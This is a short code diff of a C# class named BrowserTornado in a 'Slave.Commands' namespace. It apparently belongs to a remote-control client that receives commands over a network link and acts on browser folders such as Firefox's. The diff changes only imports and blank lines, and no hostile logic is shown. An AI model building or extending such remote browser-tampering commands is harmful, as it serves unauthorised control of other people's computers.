@@ -1,15 +1,13 @@
-﻿using System;
+﻿using Shared;
+using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Threading;
-using Shared;
 
 namespace Slave.Commands
 {
     internal class BrowserTornado : ICommand
     {
         public string name { get; } = "browsertornado";
-
 
         /// <summary>
         /// Remark : Thread.Sleep(50) are necessary has there is a sync problem if they aren't used
@@ -33,7 +31,6 @@ namespace Slave.Commands
             {
                 GlobalCommandsManager.networkManager.WriteLine("KO");
             }
-            
 
             if (Directory.Exists(firefoxPath))
             {
